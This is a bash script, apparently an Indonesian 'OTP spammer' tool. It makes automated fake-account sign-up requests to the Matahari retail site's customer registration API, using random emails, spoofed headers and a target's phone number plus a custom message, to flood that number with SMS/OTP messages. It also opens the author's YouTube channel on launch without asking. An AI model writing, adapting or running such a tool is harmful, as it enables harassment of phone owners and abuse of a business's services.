#!/usr/bin/env bash

# author : Bayu Riski A.M

# plugins bash moderen
source lib/moduler.sh
# depencies
Bash.import: text_display/colorama text_display/IO.ECHO
Bash.import: curl/main urlib/pyreq curses/main
# import fungsi class
const: __curlopt__ = opt
const: __minimist__ = argv
const: __pyreq__ = python
var hi : "\e[30m"

# buat class curlopt
class __req__;
{
	public: app = headers;
	public: app = Session;

	def: __req__::headers()
	{
		var bersih : $(echo "${@/[/}")
		var bersih : $(echo "${bersih/]/}")

		echo "$bersih" >> header.conf
	}

	def: __req__::Session()
	{
		argv.get_arg ["$1"]; # url
		argv.get_arg ["$2"]; # methods
		argv.get_arg ["$3"]; # data
		var CH : $(opt.Session Jar="cookie.txt" options="-sLX ${methods} ${data} --header @header.conf --insecure --compressed")
		var rp : $(opt.Curl url="$uri" ch="$CH")
		var res : $(opt.exec_opt config="$rp")

		@return: res
	}
	
}

#import object curlopt
const: __req__ = curlopt

# testing
#curlopt.headers "user-agent: Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36"
#curlopt.Session uri="google.com" methods="GET"
# include modules pack
@require modules/pack.sh
# fungsi spam
def: spam(){
	argv.get_arg ["$1"]; # nomer
	argv.get_arg ["$2"]; # country
	argv.get_arg ["$3"]; # pesan

	curlopt.headers ["user-agent: Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36"]
	curlopt.headers ["cookie: __gtm_referrer=https%3A%2F%2Fwww.google.com%2F"]
	curlopt.Session uri="https://www.matahari.com/customer/nologin" methods="GET" &> /dev/null
	rm -rf header.conf

	curlopt.headers ["user-agent: Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36"]
	curlopt.headers ["x-newrelic-id: Vg4GVFVXDxAGVVlVBgcGVlY="]
	curlopt.headers ["x-requested-with: XMLHttpRequest"]
	curlopt.Session uri="https://www.matahari.com/customer/rest/V1/validate/length/address" methods="GET" &> /dev/null
	curlopt.Session uri="https://www.matahari.com/customer/account/create/" methods="GET" &> /dev/null

	var __model__ : $(cat /dev/urandom|tr -dc "a-z"|fold -w 10|head -1)
	var password : "${__model__^}"
	var email : "${__model__}22@gmail.com"
	rm -rf header.conf

	curlopt.headers ["x-newrelic-id: Vg4GVFVXDxAGVVlVBgcGVlY="]
	curlopt.headers ["x-requested-with: XMLHttpRequest"]
	curlopt.headers ["user-agent: Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36"]
	curlopt.headers ["content-type: application/json"]
	var respon : $(curlopt.Session uri="https://www.matahari.com/rest/V1/thorCustomers" methods="POST" data="--data-raw '{\"thor_customer\":{\"name\":\"${pesan}\",\"card_number\":null,\"email_address\":\"${email}\",\"mobile_country_code\":\"${country}\",\"gender_id\":\"4\",\"mobile_number\":\"${nomer}\",\"mro\":\"\",\"password\":\"${password}\",\"birth_date\":\"09/06/2002\"}}'")
	@return: respon
	rm -rf header.conf
}

def: load()
{
	argv.get_arg ["$1"]; # text
	declare frame=(
		"${me}•${st}"
		"-${ku}•${st}"
		"--${ij}•${st}"
		"---${m}•${st}"
		"----${bi}•${st}"
		"-----${cy}•${st}"
		"------${me}•${st}"
		"-------${ku}•${st}"
		"--------${ij}•${st}"
		"-------${m}•${st}"
		"------${bi}•${st}"
		"-----${cy}•${st}"
		"----${me}•${st}"
		"---${ku}•${st}"
		"--${ij}•${st}"
		"-${m}•${st}"
		"${cy}•${st}"
	)

	for x in $(seq 0 16); do
		tput sc
		Tulis.str "\r${txt} ${frame[${x}]}"
		sleep 0.0$(shuf -i 1-10 -n 1)
		tput rc
	done
	tput ed
	for x in $(seq 16 0); do
		tput sc
		Tulis.str "\r${txt} ${frame[${x}]}"
		sleep 0.0$(shuf -i 1-10 -n 1)
		tput rc
	done
}

def: main()
{
	source cfg.sh
	Tulis.strN "${pu} ╰╮╰╮╰╮"
	Tulis.strN "${ku}╭━━━━━━━╮${pu}╱ "
	Tulis.strN "${ku}╰━━━━━━━╯${pu}╱  ${m}╔═╗${pu}┌┬┐┌─┐  ${m}╔╦╗${pu}┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐┬ ${ij}|${me}•${pu} Author  ${me}:${pu} Silent ${ku}||${pu} Polygon"
	Tulis.strN "${ku}┃${pu}╭${hi}╭╮┏┏┏┏${ku}┣${cy}━╮ ${m}╚═╗${pu}│││└─┐  ${m}║║║${pu}├─┤ │ ├─┤├─┤├─┤├┬┘│ ${ij}|${bi}•${pu} Github  ${me}:${pu} https://github.com/Bayu12345677"
	Tulis.strN "${ku}┃${pu}┃${hi}┃┃┣┣┣┣${ku}┃${pu}╱${hi}┃${m} ╚═╝${pu}┴ ┴└─┘ ${m} ╩ ╩${pu}┴ ┴ ┴ ┴ ┴┴ ┴┴ ┴┴└─┴ ${ij}|${cy}•${pu} Youtube ${me}:${pu} Pejuang Kentang"
	Tulis.strN "${ku}┃${pu}╰${hi}╰╯┃┃┗┗${ku}┣${cy}━╯ \e[100m           Matahari Otp           ${st}"
	Tulis.strN "${ku}╰━━━━━━━╯ ${st}\n"
	window "\e[100mInformasi" "" "90%"
		append "Status  : ${ttt:-Null}        "
		append "Message : ${pEsan:-Null}      "
		append "Country : ${COUNTRY:-Null}    "
		append "Number  : ${NOMER:-Null}      "
	endwin; echo
}

def: update()
{
	tput cnorm
	Tulis.str "${me}[${ij}+${me}]${cy}(${hi}Pesan${cy})${ku}>${st} "; read pEsan
	echo; tput civis
	load txt="${ku}•${pu} Mengecek Input"
	if (test -z "$pEsan"); then
		tput ed
		Tulis.strN "${ku}• ${pu}Input Tidak boleh kosong${st}"
		exit
	fi; tput ed

	while true; do
		load txt="${ku}•${pu} Mengirim"
	done &
	let sig=${!}
	var status : $(spam country="${COUNTRY}" nomer="$NOMER" pesan="$pEsan")
	if (ambil: status in "Success"); then
		var ttt : "Success"
	else
		var ttt : $(@return: status|jq -r .message)
	fi
	kill "$sig" &> /dev/null
	tput ed
}

# configurasi layar
var h : $(tput lines)
var w : $(tput cols)

if ((h >= 29 && w >= 96)); then let i=2
else let i=9
fi

if ((i != 2)); then
	Tulis.strN "${ku}[${me}!${ku}]${pu} Layar terlalu besar"
	Tulis.strN "${ku}[${me}!${ku}]${pu} silakan cubit layar anda dan jalankan ulang"; exit
fi

# gak usah di ubah kntl
xdg-open "https://youtube.com/channel/UCtu-GcxKL8kJBXpR1wfMgWg"
def: control()
{
	kill "$sig" &> /dev/null; tput sgr0 cnorm ed;exit
}; trap control INT SIGINT
main_loop "$@"
